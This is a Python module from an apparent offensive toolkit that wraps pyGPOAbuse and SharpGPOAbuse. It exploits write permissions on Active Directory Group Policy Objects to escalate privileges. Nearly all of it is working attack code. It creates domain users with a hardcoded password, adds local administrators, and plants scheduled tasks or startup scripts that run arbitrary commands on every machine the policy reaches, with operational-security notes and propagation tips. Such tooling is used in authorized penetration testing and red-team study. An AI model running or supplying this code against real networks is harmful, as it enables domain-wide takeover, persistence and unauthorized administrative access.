"""
GPO Abuse via GenericWrite Permission
Exploits GenericWrite/GenericAll permissions on Group Policy Objects to escalate privileges.
Supports adding users, adding admins, creating scheduled tasks, and adding startup scripts.
Uses pyGPOAbuse or SharpGPOAbuse via Exegol container execution.
"""

import shlex
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class GpoAbuse(ModuleBase):
    """
    GPO Abuse module for privilege escalation via misconfigured Group Policy Objects.

    When a user has GenericWrite or GenericAll on a GPO, this module uses pyGPOAbuse
    or SharpGPOAbuse to modify the GPO and execute arbitrary actions on machines
    where the GPO is applied.

    Supported actions:
    - adduser: Add a user to the domain
    - addadmin: Add a user to the local Administrators group
    - addschtask: Create a scheduled task with a custom command
    - addstartup: Add a startup script with a custom command
    """

    def __init__(self):
        super().__init__()
        self.name = "gpo_abuse"
        self.description = "Abuse GenericWrite on GPO to escalate privileges"
        self.author = "UwU Toolkit"
        self.version = "2.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["windows", "ad", "gpo", "privilege escalation", "genericwrite", "post"]
        self.references = [
            "https://github.com/Hackndo/pygpoabuse",
            "https://github.com/FSecureLABS/SharpGPOAbuse",
            "https://www.hackingarticles.in/domain-escalation-gpo-abuse/",
            "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces",
        ]

        self.opsec_rating = "high"
        self.opsec_notes = "Modifies GPO in SYSVOL. Changes are logged and visible in AD."

        # Options
        self.register_option("RHOSTS", "Domain Controller IP/hostname", required=True)
        self.register_option("DOMAIN", "Target Active Directory domain", required=True)
        self.register_option("USER", "Username with GenericWrite on GPO", required=True)
        self.register_option("PASS", "User password", required=True)
        self.register_option("GPO_ID", "GPO ID to abuse (e.g., 31B2F340-016D-11D2-945F-00C04FB984F9)",
                             required=True)
        self.register_option("ACTION", "Abuse action to perform",
                             default="addadmin",
                             choices=["adduser", "addadmin", "addschtask", "addstartup"])
        self.register_option("COMMAND", "Command for schtask/startup action",
                             default="net localgroup Administrators {USER} /add")
        self.register_option("TARGET_USER", "User to add for adduser/addadmin (defaults to USER)", default="")
        self.register_option("TASKNAME", "Scheduled task name (for addschtask)", default="UwU-Task")
        self.register_option("TOOL", "Tool to use: pygpoabuse or sharp",
                             default="pygpoabuse", choices=["pygpoabuse", "sharp"])

    def _build_pygpoabuse_cmd(self, domain, user, password, dc_ip, gpo_id,
                               action, command, target_user, taskname) -> str:
        """Build the pyGPOAbuse command string."""

        credentials = f"{domain}/{user}:{password}"

        if action == "adduser":
            # Add a user to the domain via GPO
            effective_user = target_user or user
            effective_cmd = f"net user {effective_user} P@ssw0rd123 /add /domain"
            cmd = (
                f"pygpoabuse.py {shlex.quote(credentials)} "
                f"-gpo-id {shlex.quote(gpo_id)} "
                f"-command {shlex.quote(effective_cmd)} "
                f"-taskname {shlex.quote(taskname)} "
                f"-f"
            )

        elif action == "addadmin":
            # Add user to local Administrators group
            effective_user = target_user or user
            effective_cmd = f"net localgroup Administrators {effective_user} /add"
            cmd = (
                f"pygpoabuse.py {shlex.quote(credentials)} "
                f"-gpo-id {shlex.quote(gpo_id)} "
                f"-command {shlex.quote(effective_cmd)} "
                f"-taskname {shlex.quote(taskname)} "
                f"-f"
            )

        elif action == "addschtask":
            # Create a scheduled task with custom command
            effective_cmd = command.replace("{USER}", target_user or user)
            cmd = (
                f"pygpoabuse.py {shlex.quote(credentials)} "
                f"-gpo-id {shlex.quote(gpo_id)} "
                f"-command {shlex.quote(effective_cmd)} "
                f"-taskname {shlex.quote(taskname)} "
                f"-f"
            )

        elif action == "addstartup":
            # Add a startup script
            effective_cmd = command.replace("{USER}", target_user or user)
            cmd = (
                f"pygpoabuse.py {shlex.quote(credentials)} "
                f"-gpo-id {shlex.quote(gpo_id)} "
                f"-command {shlex.quote(effective_cmd)} "
                f"-taskname {shlex.quote(taskname)} "
                f"-f"
            )

        else:
            cmd = ""

        if dc_ip:
            cmd += f" -dc-ip {dc_ip}"

        return cmd

    def _build_sharp_cmd(self, domain, user, password, dc_ip, gpo_id,
                          action, command, target_user, taskname) -> str:
        """Build the SharpGPOAbuse command string (executed via Exegol with mono or dotnet)."""

        effective_user = target_user or user

        if action == "adduser":
            sharp_action = f"--AddLocalAdmin --UserAccount {effective_user}"
        elif action == "addadmin":
            sharp_action = f"--AddLocalAdmin --UserAccount {effective_user}"
        elif action == "addschtask":
            effective_cmd = command.replace("{USER}", effective_user)
            sharp_action = f"--AddImmediateTask --TaskName {shlex.quote(taskname)} --Command {shlex.quote(effective_cmd)}"
        elif action == "addstartup":
            effective_cmd = command.replace("{USER}", effective_user)
            sharp_action = f"--AddUserScript --ScriptName UwUStartup --ScriptContents {shlex.quote(effective_cmd)}"
        else:
            sharp_action = ""

        # Build full command - try to find SharpGPOAbuse.exe
        cmd = (
            f"SharpGPOAbuse.exe "
            f"{sharp_action} "
            f"--GPOName {shlex.quote(gpo_id)} "
            f"--DomainController {dc_ip or domain} "
            f"--Domain {domain} "
            f"--Force"
        )

        return cmd

    def run(self) -> bool:
        """Execute GPO abuse."""
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        dc_ip = self.get_option("RHOSTS")
        gpo_id = self.get_option("GPO_ID")
        action = self.get_option("ACTION")
        command = self.get_option("COMMAND")
        target_user = self.get_option("TARGET_USER")
        taskname = self.get_option("TASKNAME")
        tool = self.get_option("TOOL")

        self.print_line()
        self.print_good("=" * 60)
        self.print_good("  GPO Abuse - Privilege Escalation")
        self.print_good("=" * 60)
        self.print_status(f"Domain: {domain}")
        self.print_status(f"User: {user}")
        self.print_status(f"DC: {dc_ip}")
        self.print_status(f"GPO ID: {gpo_id}")
        self.print_status(f"Action: {action}")
        self.print_status(f"Tool: {tool}")
        if target_user:
            self.print_status(f"Target User: {target_user}")
        if action in ("addschtask", "addstartup"):
            effective_cmd = command.replace("{USER}", target_user or user)
            self.print_status(f"Command: {effective_cmd}")
        self.print_line()

        # Build and execute command
        if tool == "pygpoabuse":
            cmd = self._build_pygpoabuse_cmd(
                domain, user, password, dc_ip, gpo_id,
                action, command, target_user, taskname
            )
        else:
            cmd = self._build_sharp_cmd(
                domain, user, password, dc_ip, gpo_id,
                action, command, target_user, taskname
            )

        if not cmd:
            self.print_error(f"Failed to build command for action: {action}")
            return False

        # Redacted display
        redacted_cmd = cmd.replace(password, "[REDACTED]")
        self.print_status(f"Executing: {redacted_cmd}")
        self.print_line()

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=120)

        # Display output
        output_text = stdout + stderr
        for line in output_text.split('\n'):
            line = line.strip()
            if not line:
                continue
            if '[+]' in line or 'success' in line.lower():
                self.print_good(line)
            elif '[-]' in line or 'error' in line.lower() or 'fail' in line.lower():
                self.print_error(line)
            elif '[*]' in line:
                self.print_status(line.replace('[*]', '').strip())
            else:
                self.print_line(f"    {line}")

        # Evaluate result
        combined = output_text.lower()
        if ret == 0 or 'success' in combined or 'created' in combined or 'added' in combined:
            self.print_line()
            self.print_good("=" * 60)
            self.print_good("GPO ABUSE SUCCESSFUL!")
            self.print_good("=" * 60)
            self.print_line()
            self.print_warning("IMPORTANT: Wait 90-120 seconds for GPO to propagate")
            self.print_warning("Or force update on target with: gpupdate /force")
            self.print_line()

            if action == "addadmin":
                effective_user = target_user or user
                self.print_good(f"User '{effective_user}' should now be in local Administrators")
                self.print_status("Verify with: net localgroup Administrators")
            elif action == "adduser":
                effective_user = target_user or user
                self.print_good(f"User '{effective_user}' should now be created in the domain")
                self.print_status("Verify with: net user /domain")
            elif action == "addschtask":
                self.print_good(f"Scheduled task '{taskname}' created via GPO")
                self.print_status("It will execute on next GPO refresh")
            elif action == "addstartup":
                self.print_good("Startup script added to GPO")
                self.print_status("It will execute on next machine reboot or GPO refresh")

            return True
        else:
            self.print_error("GPO abuse may have failed")
            self.print_error(f"Return code: {ret}")
            if stderr:
                self.print_error(f"Error output: {stderr[:500]}")
            return False

    def check(self) -> bool:
        """Check if pyGPOAbuse or SharpGPOAbuse is available."""
        tool = self.get_option("TOOL") or "pygpoabuse"

        if tool == "pygpoabuse":
            # Check locally
            pygpoabuse = find_tool("pygpoabuse.py")
            if pygpoabuse:
                self.print_good(f"Found pygpoabuse locally: {pygpoabuse}")
                return True

            # Check in Exegol
            ret, stdout, _ = self.run_in_exegol("which pygpoabuse.py", timeout=10)
            if ret == 0 and stdout.strip():
                self.print_good(f"Found pygpoabuse in Exegol: {stdout.strip()}")
                return True

            # Check Python module
            ret, stdout, _ = self.run_in_exegol(
                "python3 -c 'import pygpoabuse; print(\"OK\")'", timeout=10
            )
            if ret == 0 and 'OK' in stdout:
                self.print_good("pygpoabuse Python module available in Exegol")
                return True

            self.print_error("pygpoabuse not found")
            self.print_error("Install with: pip install pygpoabuse")
            self.print_error("Or: git clone https://github.com/Hackndo/pygpoabuse")
            return False

        elif tool == "sharp":
            # Check for SharpGPOAbuse in Exegol
            for name in ["SharpGPOAbuse.exe", "SharpGPOAbuse"]:
                ret, stdout, _ = self.run_in_exegol(f"find /opt/tools -name '{name}' 2>/dev/null | head -1", timeout=15)
                if ret == 0 and stdout.strip():
                    self.print_good(f"Found SharpGPOAbuse: {stdout.strip()}")
                    return True

            self.print_error("SharpGPOAbuse not found in Exegol")
            self.print_error("Download from: https://github.com/FSecureLABS/SharpGPOAbuse")
            return False

        return False


# Module instantiation for backwards compatibility
module = GpoAbuse()
